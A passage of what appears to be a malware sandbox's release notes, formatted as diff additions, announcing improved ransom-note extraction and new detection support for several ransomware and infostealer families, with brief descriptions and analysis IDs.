+For Lockbit, ransom note extraction has been improved to now also dump details like
+Telegram contacts, and we have fixed an issue that was preventing some URLs being
+dumped from certain variants of the note.
+
+We have also added support for BigLock, a family we previously did not have family
+classification for. The note and family tag should now be correctly displayed in the report.
+
+Along with this, we have improved/added detection and ransom note support for:
+
+DarkSide ransomware
+
+Conti ransomware
+
+200826-jdzf5d33aa
+200826-k8ykljftvn
+
+JackPot Ransomware
+
+200826-3jfzxsp9yx
+DeathRansom
+
+200803-bktwtzlfze
+
+Infostealers
+We have added a number of yara rules and other detections for a few infostealer families.
+Where possible we have also used behaviour to identify them, but often one infostealer’s
+actions look much like another, so our focus has generally been on static techniques.
+
+404Keylogger
+
+8/9
+
+
+
+Infostealer which has been exploiting COVID-19 related lures to gain infections. First
+appeared around August 2019.
+
+Analyses:
+
+200818-t1jk5m8sc6
+200624-gbxe29kehe
+
+Kutaki
+Keylogger with some other basic infostealer functionality like taking screenshots and
+harvesting data on the clipboard. Includes a range of anti-VM and anti-analysis techniques,
+although mostly a bit dated.
+
+Analyses:
+
+200805-k11vh8yarj
+200805-arnebas9fa
+
+XpertRAT
+Backdoor/stealer which can carry out a wide range of operations on an infected machine
+depending on the instructions received. Can also act as a dropper for other families.
+
+Analyses:
+
+200624-3pqyjfy64j
+200817-h4pjdtget2
